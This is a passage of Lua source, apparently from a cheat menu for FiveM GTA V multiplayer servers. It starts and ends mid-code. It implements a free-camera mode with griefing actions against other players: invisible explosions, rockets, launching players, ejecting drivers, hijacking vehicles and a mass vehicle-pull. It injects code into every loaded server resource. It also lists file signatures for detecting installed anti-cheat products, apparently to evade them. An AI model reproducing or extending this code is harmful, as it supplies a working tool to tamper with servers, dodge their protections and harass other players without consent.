    local expires = GetGameTimer() + timeout
    NetworkRequestControlOfEntity(entity)
    while not NetworkHasControlOfEntity(entity) and GetGameTimer() < expires do
        Wait(0)
        NetworkRequestControlOfEntity(entity)
    end
    return NetworkHasControlOfEntity(entity)
end

local function fcRequestModel(model)
    local hash = type(model) == "number" and model or GetHashKey(model)
    if not IsModelInCdimage(hash) or not IsModelValid(hash) then return nil end
    RequestModel(hash)
    local expires = GetGameTimer() + 5000
    while not HasModelLoaded(hash) and GetGameTimer() < expires do
        Wait(0)
        RequestModel(hash)
    end
    if not HasModelLoaded(hash) then return nil end
    return hash
end

local function fcRaycast(cam, distance)
    if not cam or not DoesCamExist(cam) then
        return false, GetGameplayCamCoord(), 0
    end
    distance = distance or 15000.0
    local origin = GetCamCoord(cam)
    local dir = fcRotToDir(GetCamRot(cam, 2))
    local dest = origin + (dir * distance)
    local ray = StartExpensiveSynchronousShapeTestLosProbe(
        origin.x, origin.y, origin.z,
        dest.x, dest.y, dest.z,
        -1, PlayerPedId(), 7
    )
    local _, hit, endCoords, _, entity = GetShapeTestResult(ray)
    if not endCoords or (endCoords.x == 0.0 and endCoords.y == 0.0 and endCoords.z == 0.0) then
        endCoords = dest
    end
    return hit == 1, endCoords, entity or 0
end

local function fcDraw3DText(coords, text, r, g, b)
    if not coords then return end
    SetDrawOrigin(coords.x, coords.y, coords.z, 0)
    SetTextScale(0.28, 0.28)
    SetTextFont(4)
    SetTextProportional(1)
    SetTextColour(r or 255, g or 255, b or 255, 255)
    SetTextCentre(true)
    SetTextOutline()
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringPlayerName(tostring(text))
    EndTextCommandDisplayText(0.0, 0.0)
    ClearDrawOrigin()
end

local function fcDrawCenteredText(text, y, scale, alpha)
    SetTextFont(4)
    SetTextScale(scale or 0.38, scale or 0.38)
    SetTextColour(255, 255, 255, alpha or 255)
    SetTextCentre(true)
    SetTextOutline()
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringPlayerName(tostring(text))
    EndTextCommandDisplayText(0.5, y)
end

local function fcModeDisplayText(fc, mode)
    if mode == "Shoot Vehicle" then
        return "Shoot Vehicle | Model - " .. tostring(fc.shootVehicles[fc.shootVehicleIndex] or "Random")
    elseif mode == "Heli Attacker" then
        return "Explode Heli | Model - " .. tostring(fc.heliModels[fc.heliIndex] or "Random")
    elseif mode == "Explode" then
        return "Explode | Method - " .. tostring(fc.explodeMethods[fc.explodeIndex] or "None")
    elseif mode == "Shoot" then
        return "Shoot | Model - " .. tostring(fc.shootMethods[fc.shootIndex] or "None")
    elseif mode == "Vehicle Spawn" then
        return "Vehicle spawner | Model - " .. tostring(fc.vehicleModels[fc.vehicleIndex] or "Random")
    elseif mode == "Ped Spawn" then
        local ped = fc.pedModels[fc.pedIndex]
        return "Ped Spawn | Model - " .. tostring(ped and ped.name or "None")
    end
    return mode
end

local function fcDrawHud(fc)
    local sW, sH = GetActiveScreenResolution()
    local theme = (next.colors and next.colors.theme) or {255, 0, 0}
    local tr, tg, tb = theme[1] or 130, theme[2] or 0, theme[3] or 0

    local drawRect = FrameAPI and FrameAPI.Drawing and FrameAPI.Drawing.DrawRect
    local drawText = FrameAPI and FrameAPI.Drawing and FrameAPI.Drawing.DrawText
    local getTextWidth = FrameAPI and FrameAPI.Fonts and FrameAPI.Fonts.GetTextWidthSize
    if not drawRect or not drawText then return end

    local order = 9980
    local cardW, cardH = 360, 64
    local cardX = math.floor((sW - cardW) * 0.5)
    local cardY = math.floor(sH - 108)

    drawRect('next_freecam_shadow', cardX + 3, cardY + 4, cardW, cardH, 0, 0, 0, 120, 9.0, order)
    drawRect('next_freecam_bg', cardX, cardY, cardW, cardH, 10, 10, 12, 238, 9.0, order + 1)

    drawRect('next_freecam_accent_l', cardX, cardY + 8, 4, cardH - 16, tr, tg, tb, 255, 2.0, order + 2)
    drawRect('next_freecam_accent_t', cardX + 14, cardY, cardW - 28, 2, tr, tg, tb, 210, 1.0, order + 2)

    local title = 'FREE CAM'
    local mode = fcModeDisplayText(fc, fc.modes[fc.mode])
    local speedText = ('VEL. %s'):format(tostring(math.floor((tonumber(fc.speed) or 1.0) + 0.5)))

    drawText('next_freecam_title', title, cardX + 18, cardY + 10, 16.0, false, 255, 255, 255, 255, 'default', order + 3)
    drawText('next_freecam_mode', mode, cardX + 18, cardY + 35, 13.0, false, 190, 190, 196, 255, 'default', order + 3)

    local speedW = 60
    if getTextWidth then
        local ok, w = pcall(getTextWidth, speedText, 13.0, 'default')
        if ok and tonumber(w) then speedW = tonumber(w) end
    end
    drawRect('next_freecam_speed_bg', cardX + cardW - speedW - 30, cardY + 12, speedW + 16, 24, 18, 18, 21, 245, 6.0, order + 2)
    drawText('next_freecam_speed', speedText, cardX + cardW - speedW - 22, cardY + 17, 13.0, false, tr, tg, tb, 255, 'default', order + 3)

    local cx, cy = math.floor(sW * 0.5), math.floor(sH * 0.5)
    drawRect('next_freecam_crosshair_outer', cx - 6, cy - 6, 12, 12, 5, 5, 6, 210, 3.0, order + 4)
    drawRect('next_freecam_crosshair_inner', cx - 2, cy - 2, 4, 4, tr, tg, tb, 255, 1.0, order + 5)
end

local function fcCycleIndex(current, count, direction)
    current = current + direction
    if current > count then current = 1 end
    if current < 1 then current = count end
    return current
end

local function fcHandleSubMode(fc, mode)
    local direction = 0
    if IsDisabledControlJustPressed(0, 190) or IsDisabledControlJustPressed(0, 175) then
        direction = 1
    elseif IsDisabledControlJustPressed(0, 189) or IsDisabledControlJustPressed(0, 174) then
        direction = -1
    end
    if direction == 0 then return end
    if GetGameTimer() - (fc.lastSubChange or 0) < 80 then return end
    fc.lastSubChange = GetGameTimer()

    if mode == "Shoot Vehicle" then
        fc.shootVehicleIndex = fcCycleIndex(fc.shootVehicleIndex, #fc.shootVehicles, direction)
    elseif mode == "Heli Attacker" then
        fc.heliIndex = fcCycleIndex(fc.heliIndex, #fc.heliModels, direction)
    elseif mode == "Explode" then
        fc.explodeIndex = fcCycleIndex(fc.explodeIndex, #fc.explodeMethods, direction)
    elseif mode == "Shoot" then
        fc.shootIndex = fcCycleIndex(fc.shootIndex, #fc.shootMethods, direction)
    elseif mode == "Vehicle Spawn" then
        fc.vehicleIndex = fcCycleIndex(fc.vehicleIndex, #fc.vehicleModels, direction)
    elseif mode == "Ped Spawn" then
        fc.pedIndex = fcCycleIndex(fc.pedIndex, #fc.pedModels, direction)
    end
end

local function fcSpawnVehicle(model, coords, heading, networked)
    for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
    FrameAPI.Inject(resourceName, [[
    CreateVehicle = function() return false end
    CreateVehicle = function() return 0 end
    ]])
    end
    local hash = fcRequestModel(model)
    if not hash then return 0 end

    local veh = nil
    local success = pcall(function()
        veh = CreateVehicle(hash, coords.x, coords.y, coords.z, heading or 0.0, networked ~= false, false)
    end)
    return veh
end

local function fcSpawnObject(model, coords)
    local hash = fcRequestModel(model)
    if not hash then return 0 end
    local obj = CreateObject(hash, coords.x, coords.y, coords.z, true, true, false)
    SetEntityHeading(obj, _nextFreecam.yaw or 0.0)
    SetModelAsNoLongerNeeded(hash)
    return obj
end

local function fcSpawnPed(model, coords)
    local hash = fcRequestModel(model)
    if not hash then return 0 end
    local ped = CreatePed(4, hash, coords.x, coords.y, coords.z, _nextFreecam.yaw or 0.0, true, true)
    SetModelAsNoLongerNeeded(hash)
    return ped
end

local function fcTeleportTo(coords)
    local ped = PlayerPedId()
    local ent = ped
    if IsPedInAnyVehicle(ped, false) then
        ent = GetVehiclePedIsIn(ped, false)
    end
    SetEntityCoordsNoOffset(ent, coords.x, coords.y, coords.z + 0.5, false, false, false)
    RequestCollisionAtCoord(coords.x, coords.y, coords.z)
end

-- local function fcSelectPlayer(entity)
--     local target = entity
--     if IsEntityAVehicle(target) then
--         local driver = GetPedInVehicleSeat(target, -1)
--         if driver ~= 0 and IsPedAPlayer(driver) then
--             target = driver
--         else
--             for seat = 0, GetVehicleMaxNumberOfPassengers(target) - 1 do
--                 local p = GetPedInVehicleSeat(target, seat)
--                 if p ~= 0 and IsPedAPlayer(p) then
--                     target = p
--                     break
--                 end
--             end
--         end
--     end
--     if target ~= 0 and IsEntityAPed(target) and IsPedAPlayer(target) then
--         local player = NetworkGetPlayerIndexFromPed(target)
--         if player and player ~= -1 then
--             _nextFreecam.selectedPlayer = player
--             next.lib.selected_player = player
--             fcNotify("Player selecionado: " .. tostring(GetPlayerName(player)) .. " [" .. tostring(GetPlayerServerId(player)) .. "]", "success")
--             return true
--         end
--     end
--     return false
-- end

local function fcAction(fc, mode, hitCoords, entity, hit)
    local camCoord = GetCamCoord(fc.cam)
    local camRot = GetCamRot(fc.cam, 2)
    local dir = fcRotToDir(camRot)

    if mode == "Look Around" then
        return
    elseif mode == "Teleport" then
        fcTeleportTo(hitCoords)
        return
    elseif mode == "Player Selector" then
        fcSelectPlayer(entity)
        return
    elseif mode == "Launch Player" then
        local target = entity
        if IsEntityAVehicle(target) then
            local d = GetPedInVehicleSeat(target, -1)
            if d ~= 0 then target = d end
        end
        if target ~= 0 and IsEntityAPed(target) and target ~= PlayerPedId() then
            fcRequestControl(target, 500)
            SetPedToRagdoll(target, 1500, 1500, 0, false, false, false)
            ApplyForceToEntity(target, 1, dir.x * 120.0, dir.y * 120.0, math.max(65.0, dir.z * 120.0), 0.0, 0.0, 0.0, 0, false, true, true, false, true)
        end
        return
    elseif mode == "Delete Entity" then
        if entity ~= 0 and DoesEntityExist(entity) and entity ~= PlayerPedId() then
            if IsEntityAPed(entity) and IsPedAPlayer(entity) then return end
            fcRequestControl(entity, 1000)
            SetEntityAsMissionEntity(entity, true, true)
            DeleteEntity(entity)
        end
        return
    elseif mode == "Shoot Vehicle" then
        local model = fc.shootVehicles[fc.shootVehicleIndex]
        local veh = fcSpawnVehicle(model, camCoord + dir * 3.5, camRot.z, true)
        if veh ~= 0 then
            SetEntityRotation(veh, camRot.x, camRot.y, camRot.z, 2, true)
            SetVehicleForwardSpeed(veh, 100.0)
        end
        return
    elseif mode == "Boost Vehicle" then
        if entity ~= 0 and IsEntityAVehicle(entity) then
            fcRequestControl(entity, 500)
            SetVehicleForwardSpeed(entity, math.max(90.0, GetEntitySpeed(entity) + 60.0))
        end
        return
    elseif mode == "Heli Attacker" then
        local model = fc.heliModels[fc.heliIndex]
        local veh = fcSpawnVehicle(model, hitCoords + fcVec(0.0, 0.0, 30.0), 0.0, true)
        if veh ~= 0 then
            SetVehicleEngineHealth(veh, -4000.0)
            SetVehicleBodyHealth(veh, 0.0)
            SetVehicleFuelLevel(veh, 1000.0)
            SetEntityVelocity(veh, 0.0, 0.0, -80.0)
        end
        return
    elseif mode == "Explode" then
        local method = fc.explodeMethods[fc.explodeIndex]
        if method == "Method 1" then
            local veh = fcSpawnVehicle("sultan", hitCoords, 0.0, true)
            if veh ~= 0 then
                SetEntityVisible(veh, false, false)
                AddVehiclePhoneExplosiveDevice(veh)
                Wait(50)
                DetonateVehiclePhoneExplosiveDevice(veh)
                CreateThread(function()
                    Wait(600)
                    if DoesEntityExist(veh) then
                        fcRequestControl(veh, 250)
                        DeleteEntity(veh)
                    end
                end)
            end
        elseif method == "Method 2" then
            local veh = fcSpawnVehicle("volatus", hitCoords + fcVec(0.0, 0.0, 30.0), 0.0, true)
            if veh ~= 0 then
                SetEntityVisible(veh, false, false)
                SetVehicleEngineHealth(veh, -4000.0)
                SetVehicleBodyHealth(veh, 0.0)
                SetEntityVelocity(veh, 0.0, 0.0, -80.0)
            end
        elseif method == "Method 3" then
            AddOwnedExplosion(PlayerPedId(), hitCoords.x, hitCoords.y, hitCoords.z, 10, 1.0, true, false, 1.0)
        else
            local veh = fcSpawnVehicle("sultan", hitCoords, 0.0, false)
            if veh ~= 0 then
                SetEntityVisible(veh, false, false)
                NetworkExplodeVehicle(veh, true, true, true)
                CreateThread(function()
                    Wait(250)
                    if DoesEntityExist(veh) then DeleteEntity(veh) end
                end)
            end
        end
        return
    elseif mode == "Shoot" then
        local method = fc.shootMethods[fc.shootIndex]
        local weapon = "weapon_pistol_mk2"
        if method == "Fuzil" then weapon = "WEAPON_SPECIALCARBINE_MK2"
        elseif method == "RPG" then weapon = "weapon_rpg"
        elseif method == "RPG 2" then weapon = "weapon_stinger"
        elseif method == "RPG 3" then weapon = "weapon_vehicle_rocket" end
        ShootSingleBulletBetweenCoords(
            camCoord.x, camCoord.y, camCoord.z,
            hitCoords.x, hitCoords.y, hitCoords.z,
            250, true, GetHashKey(weapon), PlayerPedId(), true, false, -1.0
        )
        return
    elseif mode == "Kick From Vehicle" then
        if entity ~= 0 and IsEntityAVehicle(entity) then
            local driver = GetPedInVehicleSeat(entity, -1)
            if driver ~= 0 then
                fcRequestControl(driver, 700)
                TaskLeaveVehicle(driver, entity, 16)
                SetPedToRagdoll(driver, 1000, 1000, 0, false, false, false)
            end
        end
        return
    elseif mode == "Npc Hijack" then
        if entity ~= 0 and IsEntityAVehicle(entity) then
            local vehicle = entity
            local oldDriver = GetPedInVehicleSeat(vehicle, -1)
            if oldDriver ~= 0 then
                fcRequestControl(oldDriver, 500)
                TaskLeaveVehicle(oldDriver, vehicle, 16)
            end
            local hash = fcRequestModel("mp_m_freemode_01")
            if hash then
                local npc = CreatePedInsideVehicle(vehicle, 4, hash, -1, true, true)
                SetPedKeepTask(npc, true)
                SetDriverAbility(npc, 1.0)
                SetDriverAggressiveness(npc, 1.0)
                SetBlockingOfNonTemporaryEvents(npc, true)
                TaskVehicleDriveWander(npc, vehicle, 30.0, 1074528293)
                SetModelAsNoLongerNeeded(hash)
            end
        end
        return
    elseif mode == "Bring Vehicle" then
        if entity ~= 0 and IsEntityAVehicle(entity) then
            fcRequestControl(entity, 800)
            local pc = GetEntityCoords(PlayerPedId())
            SetEntityCoordsNoOffset(entity, pc.x, pc.y, pc.z + 1.0, false, false, false)
        end
        return
    elseif mode == "Physic gun" then
        if fc.heldEntity and DoesEntityExist(fc.heldEntity) then
            local held = fc.heldEntity
            FreezeEntityPosition(held, false)
            ResetEntityAlpha(held)
            ApplyForceToEntity(held, 3, dir.x * 300.0, dir.y * 300.0, dir.z * 300.0, 0.0, 0.0, 0.0, 0, false, false, true, true, false, true)
            fc.heldEntity = nil
        elseif entity ~= 0 and IsEntityAVehicle(entity) then
            if fcRequestControl(entity, 800) then
                fc.heldEntity = entity
                SetEntityAlpha(entity, 180, false)
                FreezeEntityPosition(entity, true)
            end
        end
        return
    elseif mode == "Vehicle Spawn" then
        fcSpawnVehicle(fc.vehicleModels[fc.vehicleIndex], hitCoords, fc.yaw, true)
        return
    elseif mode == "Object Spawn" then
        local obj = fc.objectModels[fc.objectIndex]
        if obj then fcSpawnObject(obj.model, hitCoords) end
        return
    elseif mode == "Ped Spawn" then
        local ped = fc.pedModels[fc.pedIndex]
        if ped then fcSpawnPed(ped.model, hitCoords) end
        return
    end
end

local function fcBlackHoleTick(fc, hitCoords)
    if not FrameAPI.IsKeyPressed(0x01) then return end
    for _, veh in ipairs(GetGamePool("CVehicle")) do
        if DoesEntityExist(veh) then
            fcRequestControl(veh, 20)
            local pos = GetEntityCoords(veh)
            local delta = hitCoords - pos
            local vel = GetEntityVelocity(veh)
            local force = (delta * 0.25) - (vel * 0.30) + fcVec(0.0, 0.0, 0.1)
            ApplyForceToEntity(veh, 3, force.x, force.y, force.z, 0.0, 0.0, 0.0, 0, false, false, true, true, false, true)
        end
    end
end

local function fcPhysicHoldTick(fc)
    if not fc.heldEntity or not DoesEntityExist(fc.heldEntity) then
        fc.heldEntity = nil
        return
    end
    local camPos = GetCamCoord(fc.cam)
    local camRot = GetCamRot(fc.cam, 2)
    local dir = fcRotToDir(camRot)
    local holdPos = camPos + dir * (fc.heldDistance or 10.0)
    SetEntityCoordsNoOffset(fc.heldEntity, holdPos.x, holdPos.y, holdPos.z, false, false, false)
    SetEntityRotation(fc.heldEntity, camRot.x, camRot.y, camRot.z, 2, true)
end

local function fcCleanup(fc)
    local ped = PlayerPedId()
    if fc.heldEntity and DoesEntityExist(fc.heldEntity) then
        FreezeEntityPosition(fc.heldEntity, false)
        ResetEntityAlpha(fc.heldEntity)
        fc.heldEntity = nil
    end
    FreezeEntityPosition(ped, false)
    if IsPedInAnyVehicle(ped, false) then
        local veh = GetVehiclePedIsIn(ped, false)
        SetVehicleUndriveable(veh, false)
        SetVehicleEngineOn(veh, true, true, false)
    end
    if fc.lastWeapon then
        SetCurrentPedWeapon(ped, fc.lastWeapon, true)
        fc.lastWeapon = nil
    end
    if fc.cam and DoesCamExist(fc.cam) then
        SetCamActive(fc.cam, false)
        RenderScriptCams(false, true, 500, true, true, false)
        DestroyCam(fc.cam, false)
    else
        RenderScriptCams(false, true, 300, true, true, false)
    end
    fc.cam = nil
    SetFocusEntity(ped)
    local coords = GetEntityCoords(ped)
    RequestCollisionAtCoord(coords.x, coords.y, coords.z)
    NetworkOverrideReceiveRestrictions(ped, false)
    NetworkOverrideSendRestrictions(ped, false)
end

function _nextFreecam.Start()
    local fc = _nextFreecam
    if fc.running then return end
    fc.enabled = true
    fc.running = true

    nt.createTh(function()
        local ped = PlayerPedId()
        local rot = GetGameplayCamRot(2)
        fc.pitch = rot.x
        fc.yaw = rot.z
        fc.cam = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
        SetCamCoord(fc.cam, GetGameplayCamCoord())
        SetCamRot(fc.cam, rot.x, rot.y, rot.z, 2)
        SetCamFov(fc.cam, GetGameplayCamFov())
        SetCamActive(fc.cam, true)
        RenderScriptCams(true, true, 600, true, true, false)

        while fc.enabled do
            Wait(0)
            ped = PlayerPedId()

            DisableControlAction(0, 37, true)
            DisableControlAction(0, 14, true)
            DisableControlAction(0, 15, true)
            DisableControlAction(0, 16, true)
            DisableControlAction(0, 17, true)
            DisableControlAction(0, 24, true)
            DisableControlAction(0, 25, true)
            DisableControlAction(0, 30, true)
            DisableControlAction(0, 31, true)
            if fc.blockMovement then
                DisableControlAction(0, 32, true)
                DisableControlAction(0, 33, true)
                DisableControlAction(0, 34, true)
                DisableControlAction(0, 35, true)
                DisableControlAction(0, 21, true)
                DisableControlAction(0, 22, true)
                DisableControlAction(0, 36, true)
            end
            DisableControlAction(0, 174, true)
            DisableControlAction(0, 175, true)
            DisableControlAction(0, 189, true)
            DisableControlAction(0, 190, true)
            HideHudComponentThisFrame(19)
            HideHudComponentThisFrame(20)

            if fc.blockMovement then
                if not fc.lastWeapon then fc.lastWeapon = GetSelectedPedWeapon(ped) end
                SetCurrentPedWeapon(ped, GetHashKey("WEAPON_UNARMED"), true)
                FreezeEntityPosition(ped, true)
                if IsPedInAnyVehicle(ped, false) then
                    SetVehicleUndriveable(GetVehiclePedIsIn(ped, false), true)
                end
            else
                FreezeEntityPosition(ped, false)
                if IsPedInAnyVehicle(ped, false) then
                    SetVehicleUndriveable(GetVehiclePedIsIn(ped, false), false)
                end
            end

            NetworkOverrideReceiveRestrictions(ped, true)
            NetworkOverrideSendRestrictions(ped, true)

            local lookLR = GetDisabledControlNormal(0, 1)
            local lookUD = GetDisabledControlNormal(0, 2)
            local sens = 5.0
            fc.yaw = fc.yaw - (lookLR * sens)
            fc.pitch = math.max(-89.0, math.min(89.0, fc.pitch - (lookUD * sens)))

            local speed = tonumber(fc.speed) or 1.0
            local function fcPressed(control)
                return IsDisabledControlPressed(0, control) or IsControlPressed(0, control)
            end

            if fcPressed(21) then speed = speed * 3.0 end

            local camCoords = GetCamCoord(fc.cam)
            local forward = fcRotToDir(fcVec(fc.pitch, 0.0, fc.yaw))
            local right = fcRightFromYaw(fc.yaw)

            local forwardPressed = fcPressed(32) or fcPressed(150)
            local backPressed = fcPressed(33) or fcPressed(151)
            local leftPressed = fcPressed(34) or fcPressed(147)
            local rightPressed = fcPressed(35) or fcPressed(148)

            if forwardPressed then camCoords = camCoords + forward * speed end
            if backPressed then camCoords = camCoords - forward * speed end
            if leftPressed then camCoords = camCoords - right * speed end
            if rightPressed then camCoords = camCoords + right * speed end
            if fcPressed(22) then camCoords = camCoords + fcVec(0.0, 0.0, speed * 0.5) end
            if fcPressed(36) then camCoords = camCoords - fcVec(0.0, 0.0, speed * 0.5) end

            local nextPressed = IsDisabledControlJustPressed(0, 14) or IsDisabledControlJustPressed(0, 16)
            local prevPressed = IsDisabledControlJustPressed(0, 15) or IsDisabledControlJustPressed(0, 17)
            if nextPressed and GetGameTimer() - (fc.lastModeChange or 0) > 40 then
                fc.lastModeChange = GetGameTimer()
                fc.mode = fc.mode + 1
                if fc.mode > #fc.modes then fc.mode = 1 end
            elseif prevPressed and GetGameTimer() - (fc.lastModeChange or 0) > 40 then
                fc.lastModeChange = GetGameTimer()
                fc.mode = fc.mode - 1
                if fc.mode < 1 then fc.mode = #fc.modes end
            end

            SetCamCoord(fc.cam, camCoords.x, camCoords.y, camCoords.z)
            SetCamRot(fc.cam, fc.pitch, 0.0, fc.yaw, 2)
            SetCamFov(fc.cam, 70.0)
            SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
            RequestCollisionAtCoord(camCoords.x, camCoords.y, camCoords.z)

            local hit, hitCoords, entity = fcRaycast(fc.cam, 15000.0)
            local mode = fc.modes[fc.mode]
            fcHandleSubMode(fc, mode)
            fcDrawHud(fc)

            if entity ~= 0 and DoesEntityExist(entity) then
                local ep = GetEntityCoords(entity)
                if mode == "Delete Entity" then
                    fcDraw3DText(ep, IsEntityAPed(entity) and IsPedAPlayer(entity) and "[ PLAYER ]" or "[ DELETE ]", 255, 80, 80)
                elseif mode == "Player Selector" then
                    fcDraw3DText(ep, "[ SELECT ]", 80, 255, 120)
                elseif mode ~= "Look Around" then
                    fcDraw3DText(ep, "[ TARGET ]", 255, 255, 255)
                end
            end

            if mode == "Black Hole" then
                fcBlackHoleTick(fc, hitCoords)
            elseif mode == "Physic gun" then
                fcPhysicHoldTick(fc)
            end

            local mousePressed = FrameAPI.IsKeyPressed(0x01) or IsDisabledControlPressed(0, 24)
            if mousePressed and not fc.lastClick then
                fcAction(fc, mode, hitCoords, entity, hit)
            end
            fc.lastClick = mousePressed
        end

        fcCleanup(fc)
        fc.running = false
    end)
end

function _nextFreecam.Stop()
    _nextFreecam.enabled = false
end

function _nextFreecam.SetEnabled(state)
    state = state == true
    if state then
        _nextFreecam.enabled = true
        _nextFreecam.Start()
    else
        _nextFreecam.Stop()
    end
end

-- ============================================================================
-- FIM FREE CAM
-- ============================================================================
next.isResourceEmpty = function(resourceName)
    local commonFiles = {
        "client", "ui",
        "client/client.lua", "client/library.lua",
    }
    local hasContent = false
    local fileCount = 0
    local totalSize = 0
    for _, fileName in ipairs(commonFiles) do
        local fileContent = LoadResourceFile(resourceName, fileName)
        if fileContent then
            local fileSize = string.len(fileContent)
            if fileSize > 50 then
                fileCount = fileCount + 1
                totalSize = totalSize + fileSize
                hasContent = true
            end
        end
    end
    local manifest = LoadResourceFile(resourceName, "fxmanifest.lua") or LoadResourceFile(resourceName, "__resource.lua")
    if manifest then
        local clientScripts = 0
        local serverScripts = 0
        for line in string.gmatch(manifest, "[^\r\n]+") do
            if string.match(line, "client_script") then
                clientScripts = clientScripts + 1
            end
            if string.match(line, "server_script") then
                serverScripts = serverScripts + 1
            end
        end
        if (clientScripts > 0 or serverScripts > 0) and not hasContent then
            for scriptName in string.gmatch(manifest, '["\']([^"\']+%.lua)["\']') do
                local content = LoadResourceFile(resourceName, scriptName)
                if content and string.len(content) > 50 then
                    hasContent = true
                    fileCount = fileCount + 1
                    totalSize = totalSize + string.len(content)
                end
            end
        end
    end
    return not hasContent or fileCount < 1 or totalSize < 100
end
local metadataKeys = {
    "client_script", "client_scripts",
    "server_script", "server_scripts",
    "shared_script", "shared_scripts",
    "files", "escrow_ignore", "ac", "file",
    "exports", "server_exports", "ui_page",
    "dependencies", "lua54", "use_experimental_fxv2_oal",
    "node_version", "games", "ui_page_preload"
}
local function countSuspiciousFilesExact(resName, fileMap)
    local foundCounts = {}
    for _, key in ipairs(metadataKeys) do
        local i = 0
        while true do
            local file = GetResourceMetadata(resName, key, i)
            if not file then break end
            local lowerFile = file:lower()
            for pattern, exactRequired in pairs(fileMap) do
                if lowerFile:find(pattern, 1, true) then
                    foundCounts[pattern] = (foundCounts[pattern] or 0) + 1
                end
            end
            i = i + 1
        end
    end
    local totalMatchedPatterns = 0
    for pattern, exactRequired in pairs(fileMap) do
        if (foundCounts[pattern] or 0) == exactRequired then
            totalMatchedPatterns = totalMatchedPatterns + 1
        end
    end
    return totalMatchedPatterns
end
local reverseFiles = {
    ["cheatai-obfuscated.lua"] = 1, ["PlayerFreeze.lua"] = 1, ["vehicles.lua"] = 1,
    ["ptfx.lua"] = 1, ["spawnSpoofedProps.lua"] = 1, ["DamageEvent.lua"] = 1,
    ["UnauthorizedResource.lua"] = 1, ["ped.lua"] = 1, ["Player.lua"] = 1,
    ["weapons.lua"] = 1, ["clearpedtasks.lua"] = 1, ["emoteall.lua"] = 1,
    ["explosion.lua"] = 1, ["heartbeat.lua"] = 1, ["props.lua"] = 1,
    ["panel.lua"] = 1, ["cheatAI.js"] = 1, ["menu.lua"] = 1,
    ["damage.lua"] = 1, ["aimbot.lua"] = 1,
}
local moonguardFiles = {
    ["moonguard_agent.lua"] = 1, ["module_core.lua"] = 1, ["whitelistedglobal.json"] = 1,
    ["panel/config.lua"] = 2, ["panel/client.lua"] = 1, ["configs/Config.lua"] = 1,
    ["panel/server.lua"] = 1, ["html/panel/index.html"] = 1, ["yes"] = 1,
}
local electronFiles = {
    ["src/include/client.lua"] = 1, ["src/server/main.js"] = 1, ["src/server/main.lua"] = 1,
    ["src/client/main.lua"] = 1, ["web/index.html"] = 1, ["true"] = 1,
}
local chocohaxFiles = {
    ["/client/index.min.html"] = 1, ["module/*.js"] = 1, ["module/animation/tracks/*.js"] = 1,
    ["module/animation/*.js"] = 1, ["module/audio/*js"] = 1, ["module/cameras/*.js"] = 1,
    ["module/core/*.js"] = 1, ["module/extras/core/*.js"] = 1, ["module/extras/curves/*.js"] = 1,
    ["module/extras/objects/*.js"] = 1, ["module/extras/*.js"] = 1, ["module/geometries/*.js"] = 1,
    ["module/helpers/*.js"] = 1, ["module/lights/*.js"] = 1, ["module/loaders/*.js"] = 1,
    ["module/materials/*.js"] = 1, ["module/math/interpolants/*.js"] = 1, ["module/math/*.js"] = 1,
    ["module/objects/*.js"] = 1, ["module/renderers/shaders/*.js"] = 1, ["module/renderers/shaders/shaderchunk/*.js"] = 1,
    ["module/renderers/shaders/shaderlib/*.js"] = 1, ["module/renderers/webgl/*.js"] = 1, ["module/renderers/webvr/*.js"] = 1,
    ["module/renderers/*.js"] = 1, ["module/scenes/*.js"] = 1, ["module/textures/*.js"] = 1,
    ["script.js"] = 1, ["/client/deps.min.css"] = 1, ["/client/deps.min.js"] = 1,
    ["/client/main.min.js"] = 1, ["/client/*.lynx"] = 1, ["/modules/client/*.json"] = 1,
    ["core.js"] = 1, ["core.lua"] = 1, ["modules/*.lua"] = 1, ["/client/client.js"] = 1,
    ["/client/*.lua"] = 1, ["/modules/client/*.lua"] = 1,
}
local eagleFiles = {
    ["configs/events.lua"] = 1, ["configs/shared_config.lua"] = 1, ["configs/vrp/shared_config.lua"] = 1,
    ["lib/Proxy.lua"] = 1, ["configs/esx/s_config.lua"] = 1, ["render.lua"] = 1,
    ["lib/Tunnel.lua"] = 1, ["shared.lua"] = 1, ['configs/other/s_config.lua'] = 1,
    ['configs/qbcore/s_config.lua'] = 1, ['shared2.js'] = 1, ['server/main.lua'] = 1,
    ['server/server.js'] = 1, ['html/libs/three.eas.js'] = 1, ['html/messages.js'] = 1,
    ['html/main.js'] = 1, ['html/index1.html'] = 1, ['html/menu.js'] = 1,
}
local fireFiles = {
    ["src/fire-client.lua"] = 1, ["src/fire-menu.lua"] = 1, ["configs/fire-config.lua"] = 1,
    ["src/fire-server.lua"] = 1, ["gta5"] = 1, ["configs/fire-webhook.lua"] = 1,
    ["ui/index.html"] = 1, ["@oxmysql/lib/MySQL.lua"] = 1, ["FIREAC_CHANGE_TEMP_WHHITELIST"] = 2,
    ["FIREAC_CHECK_TEMP_WHITELIST"] = 2, ["FIREAC_ACTION"] = 2,
}
local finiFiles = {
    ["fini_events.js"] = 1, ["fini_events.lua"] = 1, ["anticheat.html"] = 2,
    ["anticheat_init.lua"] = 1, ["client/client.js"] = 1, ["server/server.js"] = 1, ["yes"] = 1,
}
local reaperFiles = {
    ["imports/bypass.lua"] = 1, ["imports/bypass_c.lua"] = 1, ["imports/bypass_s.lua"] = 1,
    ["classes/class.lua"] = 1, ["scripts/index.js"] = 1, ["client.lua"] = 1,
    ["imports/imports.lua"] = 2, ["imports/bypass.js"] = 1, ["web/build/index.html"] = 2,
    ["yes"] = 1, ["gta5"] = 1,
}
local waveshieldFiles = {
    ["resource/include.lua"] = 1, ["resource/waveshield.js"] = 1, ["resource/client/main.lua"] = 1,
    ["resource/server/exports.lua"] = 1, ["resource/server/auth.lua"] = 1, ["web/server.js"] = 1,
    ["web/ui.html"] = 1, ["web/ui.js"] = 1,
}
local wxanticheatFiles = {
    ["config/anticheat.lua"] = 1, ["config/punishments.lua"] = 1, ["src/init_sh.lua"] = 1,
    ["src/init_cl.lua"] = 1, ["src/functions/client/client_callbacks.lua"] = 1, ["src/nui/client/client_nui.lua"] = 1,
    ["@oxmysql/lib/MySQL.lua"] = 1, ["config/webhooks.lua"] = 1, ["src/init_sv.lua"] = 1,
    ["src/functions/server/server_callbacks.lua"] = 1, ["src/nui/server/server_nui.lua"] = 1,
    ["ui/dist/index.html"] = 2, ["yes"] = 1, ["gta5"] = 1,
}
local pegasusFiles = {
